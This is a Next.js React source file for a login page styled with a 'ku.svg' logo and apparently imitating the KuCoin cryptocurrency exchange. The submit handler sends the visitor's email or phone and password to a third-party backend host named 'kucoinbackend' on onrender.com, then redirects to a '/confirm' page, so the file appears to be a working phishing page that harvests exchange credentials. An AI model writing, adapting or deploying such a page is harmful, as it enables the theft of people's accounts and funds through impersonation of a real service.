import { useState } from "react";
import Image from "next/image";
import axios from "axios";
import { useRouter } from "next/router";
import Link from "next/link";

export default function Home() {
  const router = useRouter();
  const [emailPhone, setEmailPhone] = useState("");
  const [password, setPassword] = useState("");
  const [error, setError] = useState("");

  const handleSubmit = async () => {
    if (!emailPhone || !password) {
      setError("Please fill in all fields.");
      return;
    }

    axios
      .post("https://kucoinbackend.onrender.com/api/user/auth/login", {
        email: emailPhone,
        password: password,
      })
      .then(function (response) {
        router.push("/confirm");
        console.log(response);
      })
      .catch(function (error) {
        console.log(error);
        setError("An error occurred. Please try again later.");
      });
  };

  return (
    <>
      <header className="flex justify-between items-center md:px-16 sm:px-8 px-4 py-6 bg-white border-b-2 mb-16">
        <Link href="/">
          <Image src="ku.svg" width={100} height={100} />
        </Link>
        <div className="flex items-center gap-4">
          <button>Login</button>
          <button className="px-4 py-2 rounded-3xl bg-black text-white">
            Sign Up
          </button>
        </div>
      </header>
      <main className=" flex flex-col gap-10 md:px-16 sm:px-8 px-4 ">
        <h1 className=" text-2xl font-bold mb-5">Login</h1>
        {error && <p className="text-red-500">{error}</p>}
        <div className="flex flex-col gap-8">
          <input
            placeholder="Email/Phone"
            type="text"
            value={emailPhone}
            onChange={(e) => setEmailPhone(e.target.value)}
            className="p-4 rounded-lg border-green-500 border-2 bg-white"
          />
          <input
            placeholder="Password"
            type="password"
            value={password}
            onChange={(e) => setPassword(e.target.value)}
            className="p-4 rounded-lg border-green-500 border-2 bg-white"
          />
        </div>
        <button
          onClick={handleSubmit}
          className="px-4 py-2 rounded-3xl bg-black text-white"
        >
          Login
        </button>
      </main>
    </>
  );
}
